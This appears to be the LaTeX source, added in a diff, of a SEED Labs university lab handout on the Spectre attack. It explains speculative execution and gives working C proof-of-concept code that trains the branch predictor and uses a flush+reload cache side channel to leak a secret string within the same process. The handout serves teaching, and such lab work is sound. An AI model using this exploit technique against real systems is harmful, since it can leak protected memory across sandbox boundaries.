@@ -1,0 +1,606 @@
+\input{../../common-files/header}
+\input{../../common-files/copyright}
+
+
+\lhead{\bfseries SEED Labs -- Spectre Attack Lab}
+
+\def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}
+
+\begin{document}
+
+
+\newcommand{\spectreFigs}{./Figs}
+
+\begin{center}
+{\LARGE Spectre Attack Lab}
+\end{center}
+
+
+\seedlabcopyright{2018}
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Introduction}
+
+Discovered in 2017 and publicly disclosed in January 2018, the Spectre
+attack exploits critical vulnerabilities existing in many modern
+processors, including those from Intel, AMD, and
+ARM~\cite{Kocher2018spectre}. The vulnerabilities
+allow a program to break inter-process and intra-process isolation, so a
+malicious program can read the data from the area that is not accessible to
+it.  Such an access is not allowed by the hardware protection mechanism
+(for inter-process isolation) or software protection mechanism (for
+intra-prcess isolation), but a vulnerability exists in the design of CPUs
+that makes it possible to defeat the protections.  Because the flaw exists
+in the hardware, it is very difficult to fundamentally fix the problem,
+unless we change the CPUs in our computers. The Spectre vulnerability
+represents a special genre of vulnerabilities in the design of CPUs. Along
+with the Meltdown vulnerability, they provide an invaluable lesson for
+security education. 
+
+\underline{The learning objective} of this lab is for students to gain first-hand
+experiences on the Spectre attack. The attack itself is quite
+sophisticated, so we break it down into several small steps, each of which
+is easy to understand and perform.  Once students understand each step, it
+should not be difficult for them to put everything together to perform the
+actual attack. This lab covers a number of topics
+described in the following:
+
+\begin{itemize}[noitemsep]
+\item Spectre attack
+\item Side channel attack
+\item CPU caching
+\item Out-of-order execution and branch prediction  
+      inside CPU microarchitecture
+\end{itemize}
+
+
+
+\paragraph{Readings and videos.}
+Detailed coverage of the Spectre attack can be found in the following:
+
+\begin{itemize}
+\item Chapter 14 of the SEED Book, \seedbook
+\item Section 8 of the SEED Lecture, \seedcsvideo
+\end{itemize}
+
+
+\paragraph{Lab Environment.} \seedenvironment
+
+When using this lab, instructors should keep the followings in mind:
+First, although the Spectre vulnerability
+is a common design flaw inside Intel, AMD, and ARM CPUs, we have
+only tested the lab activities on Intel CPUs.
+Second, Intel is working on fixing this
+problem in its CPUs, so if a student's computer uses new Intel CPUs, the
+attack may not work. It is not a problem for now (February 2018),
+but six months from now, situations like this may arise.
+
+
+\paragraph{Acknowledgment} This lab was developed with the help of 
+Kuber Kohli and Hao Zhang,
+graduate students in the Department of
+Electrical Engineering and Computer Science at Syracuse University.
+
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+%\section{Code Compilation}
+%\section{Tasks 1-2: Side Channel Attacks}
+
+
+\newcommand{\sideChannelFigs}{../Meltdown_Attack/Figs}
+\input{../Meltdown_Attack/Side_Channel_Attack.tex}
+
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 3: Out-of-Order Execution and Branch Prediction}
+
+The objective of this task is to understand the out-of-order execution
+in CPUs. We will use an experiment to help students observe
+such kind of execution. 
+
+
+
+\subsection{Out-Of-Order Execution} 
+
+The Spectre attack relies on an important feature implemented in most
+CPUs.  To understand this feature, let us see the following code. 
+This code checks whether \texttt{x} is less than \texttt{size}, if so,
+the variable \texttt{data} will be updated. Assume that the value of
+\texttt{size} is 10, so if \texttt{x} equals \texttt{15}, 
+the code in Line 3 will not be executed.  
+
+\begin{lstlisting}
+1  data = 0;
+2  if (x < size) {   
+3     data = data + 5; 
+4  }
+\end{lstlisting}
+ 
+
+The above statement about the code example is true when looking from outside of the CPU.
+However, it is not completely true if we get into the CPU, and look at the execution sequence
+at the microarchitectural level. If we do that, we will find out that
+Line 3 may be successfully executed even though the value of \texttt{x} is 
+larger than \texttt{size}. This is due to an important optimization technique adopted by
+modern CPUs. It is called out-of-order execution.
+
+
+Out-of-order execution is an optimization technique that allows CPU to maximize the utilization of
+all its execution units. Instead of processing instructions
+strictly in a sequential order, a CPU executes them in parallel
+as soon as all required resources are available.
+While the execution unit of the current operation is occupied, other
+execution units can run ahead.
+
+In the code example above, at the microarchitectural level, Line 2 involves
+two operations: load the value of \texttt{size} from the memory, 
+and compare the value with \texttt{x}. If \texttt{size} is not in the CPU
+caches, it may take hundreds of CPU clock cycles before that value is read.
+Instead of sitting idle, modern CPUs try to predict the outcome 
+of the comparison, and speculatively execute the branches based on
+the estimation. Since such execution starts before the comparison even finishes,
+the execution is called out-of-order execution. 
+Before doing the out-of-order execution,  
+the CPU stores its current state and value of registers. 
+When the value of \texttt{size} finally arrives, 
+the CPU will check the actual outcome. If the prediction is true, the speculatively
+performed execution is committed and there is a significant performance gain. If the prediction
+is wrong, the CPU will revert back to its saved state, 
+so all the results produced by the out-of-order execution will be discarded like
+it has never happened.  That is why from outside we see that Line 3 was
+never executed.
+Figure~\ref{spectre:fig:spectre} illustrates the out-of-order execution
+caused by Line 2 of the sample code.
+
+
+\begin{figure}[htb]
+\centering
+\includegraphics[width=0.75\textwidth]{\spectreFigs/spectre.pdf}
+\caption{Speculative execution (out-of-order execution)}
+\label{spectre:fig:spectre}
+\end{figure}
+
+
+Intel and several CPU makers made a severe mistake in the design of the out-of-order execution.
+They wipe out the effects of the out-of-order execution on registers and memory
+if such an execution is not supposed to happen, so the execution does not lead to
+any visible effect. However, they forgot one thing, the effect on CPU caches.
+During the out-of-order execution, the referenced memory is fetched into a register and is
+also stored in the cache. If the results of the out-of-order execution have to be discarded,
+the caching caused by the execution should also be discarded. Unfortunately, this is
+not the case in most CPUs. Therefore, it creates an observable effect.
+Using the side-channel technique described in Tasks 1 and 2, we
+can observe such an effect. The Spectre attack cleverly uses this
+observable effect to find out protected secret values.
+
+
+
+%\paragraph{More details on speculative execution?} To understand 
+%the benefit of speculative execution, Let us see some data. 
+%When a micro-processor reads from the main memory i.e. RAM, the read
+%timings are about 60 nanoseconds (60 billionths of a second). Even though
+%it appears to be lightning fast to humans, to
+%micro-processor it is a really long time. A micro-processors can have cycle times as short as
+%2 nanoseconds. This cycle time is the time between one RAM access to the time when another
+%access can be started. The cycle time are different than clock cycle which is number of cycles
+%per second. So, to a microprocessor with cycle time with 2 nanosecond, 60 nanoseconds of read
+%time is really long. The L2 cache are generally at least twice as fast as RAM while L1 cache
+%are built directly in the micro-processor so the read is done at the micro-processor speed.
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{The Experiment}
+
+In this task, we use an experiment to observe the effect caused by
+an out-of-order execution. The code used in this experiment is shown below.
+Some of the functions used in the code
+is the same as that in the previous tasks, so they will not be repeated. 
+
+
+\begin{lstlisting}[caption=\texttt{SpectreExperiment.c}, label=spectre:list:outoforder]
+#include <emmintrin.h>
+#include <x86intrin.h>
+
+int size = 10;
+uint8_t array[256*4096];
+uint8_t temp = 0;
+
+#define CACHE_HIT_THRESHOLD (80)
+#define DELTA 1024
+
+void victim(size_t x) 
+{
+  if (x < size) {                         (*@\ding{192}@*)
+     temp = array[x * 4096 + DELTA];      (*@\ding{193}@*)
+  }
+}
+
+int main() 
+{
+  int i;
+
+  // FLUSH the probing array
+  flushSideChannel();
+
+  // Train the CPU to take the true branch inside victim()
+  for (i = 0; i < 10; i++) {              (*@\ding{194}@*)
+     _mm_clflush(&size);                  (*@\ding{80}@*)
+     victim(i);                           (*@\ding{195}@*)
+  }
+
+  // Exploit the out-of-order execution 
+  _mm_clflush(&size);                     (*@\ding{80}@*)
+  for (i = 0; i < 256; i++)  
+    _mm_clflush(&array[i*4096 + DELTA]);
+  victim(97);                             (*@\ding{196}@*)
+
+  // RELOAD the probing array
+  reloadSideChannel();
+  return (0);
+}
+\end{lstlisting}
+
+
+For CPUs to perform a speculative execution, they should be able to
+predict the outcome of the if condition.  CPUs keep a record of the branches taken in the past,
+and then use these past results to predict what branch should be taken in a 
+speculative execution. 
+Therefore, if we would like a particular branch to be taken in 
+a speculative execution, we should train the CPU, so our selected branch 
+can become the prediction result. The training is done 
+in the \texttt{for} loop starting from Line \ding{194}. 
+Inside the loop, we invoke \texttt{victim()} with a small argument (from 0 to 9). These values are
+less than the value \texttt{size}, so the true-branch of the if-condition in Line \ding{192} is
+always taken. This is the training phase, which essentially trains the CPU to expect the 
+if-condition to come out to be true. 
+
+
+Once the CPU is trained, we pass a larger value (\texttt{97})
+to the \texttt{victim()} function (Line \ding{196}). This value is larger than \texttt{size},
+so the false-branch of the if-condition inside \texttt{victim()} will be taken in
+the actual execution, not the true-branch. However, we have flushed the variable \texttt{size}
+from the memory, so getting its value from the memory may take a while. This is when the CPU
+will make a prediction, and start speculative execution. 
+
+
+\subsection{Task 3} 
+
+
+Please compile the \texttt{SpectreExperiment.c} program 
+shown in Listing~\ref{spectre:list:outoforder} (see Section~\ref{sidechannel:sec:compilation}
+for the compilation instruction); 
+run the program and describe your observations. 
+There may be some noise in the side channel due to extra things cached by the
+CPU, we will reduce the noise later, but for now you can execute the task multiple times to
+observe the effects. Please observe whether Line \ding{193} is executed 
+or not when \texttt{97} is fed into \texttt{victim()}.  
+Please also do the followings:
+
+\begin{itemize}
+\item Comment out the lines marked with \ding{80} and execute again. Explain your
+observation. After you are done with this experiment, 
+uncomment them, so the subsequent tasks are not affected.
+
+\item Replace Line \ding{195} with \texttt{victim(i + 20)}; run the code again and
+explain your observation. 
+%Because \texttt{i + 20} is always larger than the value 
+%of \texttt{size}, the false-branch of the if-condition in Line \ding{192} will always be 
+%executed. Basically, we are training the CPU to go to the false-branch.
+%That should affect the out-of-order execution when 
+%\texttt{victim()} is called at Line \ding{195}.   
+\end{itemize}
+ 
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 4: The Spectre Attack}
+
+
+As we have seen from the previous task, we can get CPUs to execute a true-branch of an
+if statement, even though the condition is false. If such an out-of-order execution does not
+cause any visible effect, it is not a problem. However, most CPUs with this feature do not
+clean the cache, so some traces of the out-of-order execution is left behind. The 
+Spectre attack uses these traces to steal protected secrets. 
+
+
+These secrets can be data in another process or data in the same process. 
+If the secret data is in another process, the process isolation at the hardware level prevents 
+a process from stealing data from another process. If the data is in the same process, 
+the protection is usually done via software, such as sandbox mechanisms.  
+The Spectre attack can be launched against both types of secret. However, 
+stealing data from another process is much harder than stealing data from the same process. For
+the sake of simplicity, this lab only focuses on stealing data from the same process. 
+
+When web pages from different servers are opened inside a browser, they are often opened in the
+same process. The sandbox implemented inside the browser will provide an isolated environment
+for these pages, so one page will not be able to access another page's data. 
+Most software protections rely on condition checks to decide whether an access should be
+granted or not. With the Spectre attack, we can get CPUs to execute (out-of-order) 
+a protected code branch even if the condition checks fails, essentially defeating
+the access check.
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{The Setup for the Experiment} 
+
+
+\begin{figure}[htb]
+\centering
+\includegraphics[width= 0.8\textwidth]{\spectreFigs/buffer.pdf}
+\caption{Experiment setup: the buffer and the protected secret}
+\label{spectre:fig:buffer}
+\end{figure}
+
+Figure~\ref{spectre:fig:buffer} illustrates the setup for the experiment. 
+In this setup, there are two regions: a restricted region and a non-restricted region. 
+The restriction is achieved via an if-condition implemented in a sandbox function
+described below. The sandbox function returns the value of \texttt{buffer[x]} for a \texttt{x} 
+value provided by users, only if \texttt{x} is less than the 
+size of the buffer; otherwise, nothing is returned. Therefore, this sandbox function 
+will never return anything in the restricted area to users.
+
+
+\begin{lstlisting}
+unsigned int buffer_size = 10;
+uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
+
+uint8_t restrictedAccess(size_t x) 
+{
+  if (x < buffer_size) {   
+     return buffer[x];
+  } else {
+     return 0;
+  }
+} 
+\end{lstlisting}
+
+
+There is a secret value in the restricted area, the address of which 
+is known to the attacker. However, the attacker cannot directly 
+access the memory holding the secret value; the only way to access the 
+secret is through the above sandbox function. From the previous task, we have learned that
+although the true-branch will never be executed if \texttt{x} is larger than the buffer size,
+at microarchitectural level, it can be executed and some traces can be left behind
+when the execution is reverted. 
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{The Program Used in the Experiment}
+
+
+The code for the basic Spectre attack is shown below. In this code, there is a
+secret defined in Line \ding{192}. Assume that we cannot directly
+access the \texttt{secret} variable or the \texttt{buffer\_size} variable (we do assume that we
+can flush \texttt{buffer\_size} from the cache). Our goal is to print out the secret
+using the Spectre attack. The code below only steals the first byte of the secret. Students can
+extend it to print out more bytes. 
+
+
+\begin{lstlisting}[caption=\texttt{SpectreAttack.c}, label=spectre:list:spectreattack]
+#define DELTA 1024
+
+unsigned int buffer_size = 10;
+uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
+uint8_t temp = 0;
+char *secret = "Some Secret Value";     (*@\ding{192}@*)
+uint8_t array[256*4096];
+
+// Sandbox Function 
+uint8_t restrictedAccess(size_t x) 
+{
+  if (x < buffer_size) {         
+     return buffer[x];           
+  } else {
+     return 0;
+  }
+}
+
+void spectreAttack(size_t larger_x) 
+{
+  int i;
+  uint8_t s;
+
+  // Train the CPU to take the true branch inside restrictedAccess().
+  for (i = 0; i < 10; i++) { restrictedAccess(i); }
+
+  // Flush buffer_size and array[] from the cache.
+  _mm_clflush(&buffer_size);           
+  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+
+  // Ask restrictedAccess() to return the secret in out-of-order execution.
+  s = restrictedAccess(larger_x);                      (*@\ding{193}@*)
+  array[s*4096 + DELTA] += 88;                         (*@\ding{194}@*)         
+}
+
+int main()
+{
+  flushSideChannel();   
+  size_t larger_x = (size_t)(secret - (char*)buffer);  (*@\ding{195}@*)
+  spectreAttack(larger_x);
+  reloadSideChannel(); 
+  return (0);
+}
+\end{lstlisting}
+
+
+Most of the code is the same as that in Listing~\ref{spectre:list:outoforder}, so
+we will not repeat their explanation here. The most important part is 
+in Lines \ding{193}, \ding{194}, and \ding{195}. Line \ding{195}
+calculates the offset of the secret from the beginning of the buffer~(we assume that 
+the address of the secret is known to the attacker; in real attacks, there are many ways for 
+attackers to figure out the address, including guessing).
+The offset, which is definitely larger than 10, is fed into the \texttt{restrictedAccess()} 
+function. Because we have trained the CPU to take the true-branch inside
+\texttt{restrictedAccess()}, the CPU will return \texttt{buffer[larger\_x]}, which contains
+the value of the secret, in the out-of-order execution. 
+The secret value then causes its corresponding element in \texttt{array[]} to
+be loaded into cache. All these steps will eventually be reverted, so 
+from outside, only zero is returned from \texttt{restrictedAccess()}, not the value of the secret.
+However, the cache is not cleaned, and \texttt{array[s*4096 + DELTA]} is still kept in
+the cache. Now, we just need to use the side-channel technique to figure out which element of the
+\texttt{array[]} is in the cache.  
+
+
+\paragraph{The Task.} Please compile and execute 
+\texttt{SpectreAttack.c}. Describe your observation and note whether you are able to steal the
+secret value. If there is a lot of noise in the side channel, you may not get consistent results 
+every time. To overcome this,
+you should execute the program multiple times and see whether you can get the secret value. 
+
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 5: Improve the Attack Accuracy}
+
+
+In the previous tasks, it may be observed that the results do have some noise and the results
+are not always accurate. This is because CPU sometimes load extra values in cache expecting
+that it might be used at some later point, or the threshold is not very accurate. 
+This noise in cache can affect the results of our
+attack. We need to perform the attack multiple times; instead of doing it manually,
+we can use the following code to perform the task automatically.
+
+We basically use a statistical technique.
+The idea is to create a score array of size 256, one element for each possible
+secret value. We then run our attack for multiple times. Each time, if our
+attack program says that \texttt{k} is the secret (this result may be
+false), we add \texttt{1} to \texttt{scores[k]}.  After running the attack for many
+times, we use the value \texttt{k} with
+the highest score as our final estimation of the secret.  This will produce
+a much reliable estimation than the one based on a single run. The revised
+code is shown in the following.
+
+
+%One reason for the noise was the way we
+%probe the array to read from the side channel. Till now, we were reading the array
+%sequentially. To increase the performance, the CPU loads a lot of values from the $array$ into
+%the cache. To prevent this, we use the code in line \ding{192}. The code simply assigns a value
+%between 0 \& 255 to $random\_i$ and the value is not repeated. Since, the value is randomly
+%selected the CPU does not load the extra values into the cache reducing the noise. 
+
+
+\begin{lstlisting}[caption=SpectreAttackImproved.c]
+static int scores[256];
+
+void reloadSideChannelImproved()
+{
+  int i;
+  volatile uint8_t *addr;
+  register uint64_t time1, time2;
+  int junk = 0;
+  for (i = 0; i < 256; i++) {
+     addr = &array[i * 4096 + DELTA];
+     time1 = __rdtscp(&junk);
+     junk = *addr;
+     time2 = __rdtscp(&junk) - time1;
+     if (time2 <= CACHE_HIT_THRESHOLD)
+        scores[i]++; /* if cache hit, add 1 for this value */
+  }
+}
+
+void spectreAttack(size_t larger_x) 
+{
+  int i;
+  uint8_t s;
+
+  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+
+  // Train the CPU to take the true branch inside victim().
+  for (i = 0; i < 10; i++) {      
+     _mm_clflush(&buffer_size);                  
+     restrictedAccess(i);                        
+  }
+
+  // Flush buffer_size and array[] from the cache.
+  _mm_clflush(&buffer_size);           
+  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
+
+  // Ask victim() to return the secret in out-of-order execution.
+  s = restrictedAccess(larger_x);         
+  array[s*4096 + DELTA] += 88;                  
+}
+
+
+int main()
+{
+  int i;
+  uint8_t s;
+  size_t larger_x = (size_t)(secret-(char*)buffer);
+  flushSideChannel();   
+
+  for (i = 0; i < 256;  i++) scores[i] = 0;
+  for (i = 0; i < 1000; i++) {
+      spectreAttack(larger_x);
+      reloadSideChannelImproved();
+  }
+
+  int max = 0;
+  for (i = 0; i < 256; i++){
+     if(scores[max] < scores[i])  max = i;
+  }
+ 
+  printf("Reading secret value at %p = ", (void*)larger_x);
+  printf("The  secret value is %d\n", max);
+  printf("The number of hits is %d\n", scores[max]);
+  return (0);
+}
+\end{lstlisting}
+
+You may observe that when running the code above, the one with the highest score is always
+\texttt{scores[0]}. Please figure out the reason, and fix the code above,
+so the actual secret value (which is not zero) will be printed out. 
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 6: Steal the Entire Secret String}
+
+In the previous task, we  just read the first character of the \texttt{secret}
+string. In this task, we need to print out the entire string using the 
+Spectre attack. Please write your own code or extend the code in Task 5; include your
+execution results in the report.
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Submission}
+
+\seedsubmission
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\bibliographystyle{plain}
+\def\baselinestretch{1}
+\bibliography{BibMeltdownSpectre}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\end{document}
+
+
